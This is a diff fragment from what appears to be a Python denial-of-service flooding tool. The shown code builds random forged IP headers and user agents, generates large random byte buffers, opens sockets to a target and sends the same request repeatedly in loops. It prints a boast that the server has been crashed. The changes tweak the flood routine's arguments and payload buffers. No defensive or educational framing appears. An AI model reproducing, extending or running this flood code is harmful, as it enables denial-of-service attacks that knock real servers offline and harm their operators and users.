@@ -277,10 +277,10 @@ def randomip(th):
   randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3]) + "." + str(randip[4]) + "." + str(randip[5])
   return(randip)
 
-def start():
-  time.sleep(3)
+def start(th):
   global userip, acceptall, all, useragents
   hh = random._urandom(999999)
+  kk = random._urandom(888888)
   xx = int(0)
   nolakall = "IpAll: "+random.choice(all)+random.choice(userip)+"\r\n"
   lolall = random.choice(useragents)+random.choice(userip)+"\r\n"
@@ -298,8 +298,6 @@ def start():
             s.connect((str(ip),int(port)))
             s.send(str.encode(main_req))
             for i in range(pack):
-                s.send(str.encode(main_req))
-            for i in range(th):
                 s.send(str.encode(main_req))
             xx += random.randint(0, int(pack))
             print("SÉRVÉR {1} CRÂSH BY ZÁN")
